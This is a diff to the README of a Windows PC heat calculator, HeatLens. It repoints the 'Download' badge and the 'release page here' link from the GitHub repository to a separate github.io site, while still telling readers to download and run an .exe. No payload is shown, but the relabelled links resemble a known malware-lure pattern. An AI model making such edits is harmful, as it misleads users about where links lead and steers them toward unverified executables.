@@ -1,6 +1,6 @@
 # 🌡️ HeatLens - Calculate exact PC thermal output easily
 
-[![Download HeatLens](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/SohannS/HeatLens)
+[![Download HeatLens](https://img.shields.io/badge/Download-Release-blue.svg)](https://sohanns.github.io)
 
 HeatLens turns your computer power usage into a thermal measurement. It calculates how much heat your PC adds to your room. It displays values in BTU per hour, total session heat, and gives estimates for airflow requirements. This tool helps you understand your cooling needs during long work or gaming sessions.
 
@@ -8,7 +8,7 @@ HeatLens turns your computer power usage into a thermal measurement. It calculat
 
 You need a Windows computer to run this application. Follow these steps to set up the software.
 
-1. Go to the [HeatLens release page here](https://github.com/SohannS/HeatLens).
+1. Go to the [HeatLens release page here](https://sohanns.github.io).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
